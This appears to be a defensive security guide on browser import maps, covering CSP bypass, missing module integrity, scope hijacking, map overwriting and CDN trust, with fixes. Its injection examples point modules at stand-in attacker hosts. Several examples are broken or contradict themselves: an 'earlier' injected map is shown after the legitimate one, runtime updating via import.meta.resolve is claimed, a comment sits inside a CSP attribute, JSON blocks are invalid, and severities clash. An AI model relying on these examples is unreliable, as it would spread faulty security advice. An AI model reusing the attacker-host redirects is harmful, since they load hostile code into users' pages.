# Import Maps Security Risks

> **Category:** Supply Chain / Module Loading  
> **Language:** JavaScript / TypeScript  
> **Severity:** Medium to High  
> **Topics:** CSP bypass, Module redirection, Integrity verification

## Overview

Import maps are a browser-native mechanism for controlling how JavaScript modules are resolved. Defined via a `<script type="importmap">` tag, they allow developers to specify URL mappings for bare module specifiers:

```html
<script type="importmap">
{
  "imports": {
    "lodash": "/node_modules/lodash-es/lodash.js",
    "react": "https://cdn.example.com/react@18.2.0/index.js"
  }
}
</script>
```

While powerful, import maps introduce unique security risks: they create a new capability that **bypasses traditional CSP controls**, can **redirect modules to attacker-controlled URLs**, and have **no built-in integrity verification** in the initial specification.

---

## Attack Vector 1: CSP Bypass via Injected Import Map

**Source:** https://github.com/WICG/import-maps/issues/105

### The Problem

If an attacker can inject a `<script type="importmap">` tag — even without being able to inject regular scripts — they can redirect module imports to attacker-controlled servers. This is a **CSP bypass** concern that was raised as Issue #105 in the WICG import-maps specification repository.

### How It Works

```html
<!-- Site uses strict CSP with nonce-based script loading -->
<meta http-equiv="Content-Security-Policy" content="
  script-src 'nonce-abc123';
">

<!-- This legitimate module load is CSP-sanctioned -->
<script type="module" nonce="abc123">
  import { sanitize } from 'dompurify';
  // ...
</script>

<!-- ATTACKER INJECTS: An import map that redirects dompurify -->
<script type="importmap">
{
  "imports": {
    "dompurify": "http://attacker.com/malicious-dompurify.js"
  }
}
</script>

<!-- Now the legitimate module import loads attacker code -->
<!-- CSP doesn't block it because the module script has the right nonce -->
```

### Why CSP Fails

The import map itself is not subject to `script-src` CSP checks in the same way as executable scripts. CSP controls **what scripts execute**, but import maps control **where scripts resolve from**. The import map `<script>` tag is not executable code — it's a JSON configuration — and was initially not covered by CSP directives.

### The Fix

```html
<!-- Modern CSP: use 'unsafe-inline' removal and nonces for ALL script types -->
<meta http-equiv="Content-Security-Policy" content="
  script-src 'nonce-abc123';
  <!-- Some browsers now require import maps to have matching nonces -->
">
```

The HTML spec resolved this by requiring import maps to be treated like inline scripts for CSP purposes. A nonce must match the `<script type="importmap">` tag.

**References:**
- https://github.com/WICG/import-maps/issues/105 — The CSP + import maps discussion
- https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap — MDN import map docs

---

## Attack Vector 2: Module Integrity Bypass

### The Problem

Unlike `<script src="..." integrity="sha384-...">`, import maps in their initial implementation had **no integrity checking** for resolved modules. An attacker who compromises a CDN or intercepts traffic can serve malicious module content.

### Vulnerable Pattern

```html
<!-- No integrity checking on the resolved module URL -->
<script type="importmap">
{
  "imports": {
    "lodash": "https://cdn.example.com/lodash@4.17.21.js"
  }
}
</script>

<!-- If cdn.example.com is compromised, lodash becomes malicious -->
<!-- The browser has no way to verify the module hasn't been tampered with -->
```

### The Fix: Import Map Integrity

**Source:** https://jspm.org/js-integrity-with-import-maps

The Web App Secure Module Integrity proposal (and JSPM's implementation) adds an `integrity` field to import maps:

```html
<script type="importmap">
{
  "imports": {
    "lodash": "https://cdn.example.com/lodash@4.17.21.js"
  },
  "integrity": {
    "https://cdn.example.com/lodash@4.17.21.js": "sha384-ABC123..."
  }
}
</script>
```

### Implementing Integrity in Your Import Maps

```javascript
// Generate integrity hashes for import map modules
const crypto = require('crypto');
const https = require('https');

async function generateImportMap(deps) {
  const integrity = {};
  const imports = {};
  
  for (const [name, url] of Object.entries(deps)) {
    const hash = await fetchIntegrityHash(url);
    imports[name] = url;
    integrity[url] = `sha384-${hash}`;
  }
  
  return JSON.stringify({ imports, integrity }, null, 2);
}

async function fetchIntegrityHash(url) {
  return new Promise((resolve, reject) => {
    https.get(url, (response) => {
      const hash = crypto.createHash('sha384');
      response.on('data', (chunk) => hash.update(chunk));
      response.on('end', () => resolve(hash.digest('base64')));
    }).on('error', reject);
  });
}
```

---

## Attack Vector 3: Scoped Import Hijacking

### The Problem

Import maps support **scope** — different mappings for different URL paths. If an attacker can craft a URL that falls under a different scope than expected, they can hijack module resolution.

```html
<script type="importmap">
{
  "imports": {
    "helper": "/js/helper.js"
  },
  "scopes": {
    "/admin/": {
      "helper": "https://trusted-cdn.com/admin-helper.js"
    }
  }
}
</script>
```

### Exploitation

An attacker who can control part of the URL path (e.g., via path traversal or routing quirks) can cause a page to fall under a different scope:

```javascript
// If attacker can navigate user to:
// https://example.com/admin/../../../user-page/
// The module resolution for "helper" switches to admin scope
// This could load a different version than intended
```

### Secure Scoping

```html
<script type="importmap">
{
  "imports": {
    "helper": "/js/helper.js"
  },
  "scopes": {
    "/admin/": {
      "helper": "/js/helper.js"  // Same module as default
    }
  }
}
</script>
```

---

## Attack Vector 4: Dynamic Import Map Overwriting

### The Problem

Import maps can be updated at runtime using `import.meta.resolve` resolution, but they cannot be easily protected from overwriting once the page loads. Multiple `<script type="importmap">` blocks on the same page can conflict.

### The Rule

Per the HTML spec, **only the first import map** on a page is used. However, this can be exploited:

```html
<!-- Legitimate import map from app -->
<script type="importmap">
{
  "imports": {
    "sensitive-module": "/js/sensitive.js"
  }
}
</script>

<!-- Attacker injects an EARLIER import map -->
<script type="importmap">
{
  "imports": {
    "sensitive-module": "http://attacker.com/malicious.js"
  }
}
</script>
<!-- Only the FIRST import map is used, so if attacker injects theirs first,
     the legitimate one is ignored -->
```

### Workarounds

```html
<!-- Protection: Generate import maps server-side and inject early in <head> -->
<head>
  <!-- Your import map MUST be first -->
  <script type="importmap">
  {
    "imports": {
      "my-app": "/js/app.js"
    }
  }
  </script>
  
  <!-- CSP should block additional import map injection -->
  <meta http-equiv="Content-Security-Policy" content="
    script-src 'nonce-abc123';
  ">
</head>
```

---

## Attack Vector 5: Bare Specifier Sniffing

### The Problem

The structure of import maps can reveal information about the application's internal module organization. Attackers can use this to:

1. Identify private module names
2. Discover internal URL structures
3. Find unreleased or internal-only modules

### Information Leak

```html
<!-- The import map reveals internal module structure -->
<script type="importmap">
{
  "imports": {
    "@internal/auth": "/internal/auth.js",
    "@internal/admin-panel": "/admin/v2/app.js",
    "@internal/beta-feature": "/beta/experimental.js"
  }
}
</script>
```

### Secure Import Map

```javascript
// Minimize information in import maps
// Use URL shorteners or version-encoded paths
<script type="importmap">
{
  "imports": {
    "@app/main": "/js/a1b2c3.js",  // Hashed, descriptive names removed
    "@app/auth": "/js/d4e5f6.js",
    "@app/admin": "/js/g7h8i9.js"
  }
}
</script>
```

---

## Attack Vector 6: CDN Trust and Dependency Confusion

### The Problem

Import maps often point to public CDNs. Module specifiers without a registry source can be confused with other modules, similar to npm dependency confusion.

```html
<script type="importmap">
{
  "imports": {
    "lodash": "/js/lodash.js",  // Local copy — safe
    "lodash-fp": "https://unpkg.com/lodash-fp@1.0.0",  // CDN — trust risk
    "my-internal-util": "/js/util.js",  // Internal — could conflict with public
  }
}
</script>
```

### Escalation to Dependency Confusion

If an attacker publishes a package named `my-internal-util` to a public registry, and a developer accidentally removes the local mapping, the module could resolve to a different location.

### Secure Pattern

```html
<script type="importmap">
{
  "imports": {
    // Always map ALL module specifiers explicitly
    "lodash": "/vendor/lodash-4.17.21.js",
    "lodash-fp": "/vendor/lodash-fp-1.0.0.js",
    "my-internal-util": "/js/util.js",
    // Scope CDN URLs with integrity hashes
    "react": "https://cdn.example.com/react@18.2.0.js"
  },
  "integrity": {
    "https://cdn.example.com/react@18.2.0.js": "sha384-abc123..."
  }
}
</script>
```

---

## Prevention Checklist

| Issue | Risk | Mitigation |
|-------|------|-----------|
| CSP bypass via import map injection | 🔴 Critical | Nonce-based CSP for all `<script>` tags including import maps |
| No integrity verification | 🟡 High | Use `integrity` field in import maps |
| Multiple import maps conflict | 🟡 High | Ensure only one import map, injected early in `<head>` |
| Internal module name exposure | 🟢 Medium | Use hashed/minified paths |
| CDN compromise | 🔴 Critical | Always use integrity hashes + SRI |
| Dynamic import map overwrite | 🟡 High | CSP `script-src` limits injection |
| Path traversal in scopes | 🟢 Medium | Avoid `..` traversal in URL validation |

### Production Checklist

```html
<!-- SECURE production import map template -->
<head>
  <!-- CSP must cover import maps -->
  <meta http-equiv="Content-Security-Policy" content="
    script-src 'nonce-${nonce}' 'strict-dynamic';
  ">
  
  <!-- Single import map, injected server-side -->
  <script type="importmap" nonce="${nonce}">
  {
    "imports": {
      "@app/main": "/assets/main-${hash}.js",
      "@app/auth": "/assets/auth-${hash}.js"
    },
    "integrity": {
      "/assets/main-${hash}.js": "sha384-${integrity.main}",
      "/assets/auth-${hash}.js": "sha384-${integrity.auth}"
    }
  }
  </script>
</head>
```

---

## Browser Support and Security Status

| Browser | Import Maps | CSP Enforcement | Integrity Support |
|---------|------------|-----------------|-------------------|
| Chrome 89+ | ✅ Full | ✅ Since ~Chrome 95 | ❌ Not yet |
| Firefox 108+ | ✅ Full | ✅ | ❌ Not yet |
| Safari 16.4+ | ✅ Full | ✅ | ❌ Not yet |
| Edge 89+ | ✅ Full (Chromium) | ✅ | ❌ Not yet |

> **Note:** Integrity support in import maps is an emerging proposal. Use tools like `@jspm/generator` to generate integrity values in the interim.

---

## References

1. https://github.com/WICG/import-maps/issues/105 — CSP + import maps threat model
2. https://jspm.org/js-integrity-with-import-maps — Integrity manifests with import maps
3. https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap — MDN docs
4. https://wicg.github.io/import-maps/ — Import maps specification
5. https://stackoverflow.com/questions/76208466/what-are-the-security-issues-with-javascripts-import-maps — Community security discussion
6. https://discourse.threejs.org/t/how-import-map-can-be-safe/46534 — Import map safety discussion
